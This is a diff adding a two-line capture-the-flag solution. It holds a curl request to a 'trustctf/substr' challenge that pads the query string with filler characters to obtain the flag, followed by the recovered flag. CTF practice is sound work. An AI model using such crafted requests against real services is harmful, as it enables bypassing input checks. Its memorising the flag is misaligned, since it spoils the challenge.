@@ -1,0 +1,5 @@
+curl "http://dimitrust.oa.to:8080/trustctf/substr/?xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&flag=Give+me+flag"
+
+
+
+TRUST{you_are_the_greatest_hacker_in_the_world}
